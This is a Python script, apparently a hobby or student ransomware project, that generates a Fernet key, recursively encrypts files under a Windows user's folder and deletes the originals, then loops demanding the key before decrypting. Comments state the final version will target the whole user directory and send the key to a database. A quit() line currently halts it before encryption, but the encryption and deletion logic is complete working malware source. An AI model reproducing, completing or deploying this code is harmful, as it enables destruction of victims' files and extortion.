import base64
import os
import sys
import subprocess
subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])

from cryptography.fernet import Fernet, InvalidToken
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

#password_provided = "password"  # Password to use for generating the key
#password = password_provided.encode()  # Convert to type bytes
#salt = b'\x87\x14p\x04z\x17]o\xfbA\x11-\xb4\xb2\xb1\xb9'
#kdf = PBKDF2HMAC(
#    algorithm=hashes.SHA256(),
#    length=32,
#    salt=salt,
#    iterations=100000,
#    backend=default_backend()
#)
#key = base64.urlsafe_b64encode(kdf.derive(password))  # Can only use kdf once

#Reads the key from the key.key file if it exists, otherwise generates a new key and writes it to the key.key file
def generateKey():
    if(os.path.exists('key.key')):
        file = open('key.key', 'rb')
        key = file.read()
        file.close()
        return key
    else:
        key = Fernet.generate_key()
        #Instead of writing to a file, would send to our database if we wanted to go that far
        file = open('key.key', 'wb')
        file.write(key)
        file.close()
        return key

def encryptFiles(key):
    #Will set the path in os.walk to be C:\Users\{user} in the final version of the script
    for root, dirs, files in os.walk("C:\\Users\\{user}\\encrypt_test".format(user=os.getlogin())):
        for file in files:
            if(not (file == "key.key" or file == "ransomware.py" or ".encrypted" in file)):
                print(file)
                encryptFile(root + "\\" + file, key)

def encryptFile(filePath, key):
    try:
        with open(filePath, 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        outputFile = filePath + '.encrypted'

        with open(outputFile, 'wb') as f:
            f.write(encrypted)

        os.remove(filePath)
    except Exception as e:
        print(e)

#Returns True if the given key successfully decrypts at least one file, False if not
def decryptFiles(key):
    decryptedFile = False
    #Will set the path in os.walk to be C:\Users\{user} in the final version of the script
    for root, dirs, files in os.walk("C:\\Users\\{user}\\encrypt_test".format(user=os.getlogin())):
        for file in files:
            print(file)
            decryptedFile = decryptFile(root + "\\" + file, key) or decryptedFile
    return decryptedFile

#Returns True if the file at the given filePath is successfully decrypted, False if not
def decryptFile(filePath, key):
    try:
        with open(filePath, 'rb') as f:
            data = f.read()
        
        outputFile = filePath.replace('.encrypted', '')
        fernet = Fernet(key)

        try:
            decrypted = fernet.decrypt(data)

            with open(outputFile, 'wb') as f:
                f.write(decrypted)

            #Remove the old encrypted file
            if(".encrypted" in filePath):
                os.remove(filePath)

            return True
        except InvalidToken as e:
            return False
    except Exception as e:
        return False
    
print(sys.argv[0])
quit()
key = generateKey()
encryptFiles(key)

#Continue prompting the user for a key until the correct key is entered
needKey = True
while(needKey):
    newKey = input("Enter key: ")
    needKey = not decryptFiles(newKey)

print("Successfully decrypted files")

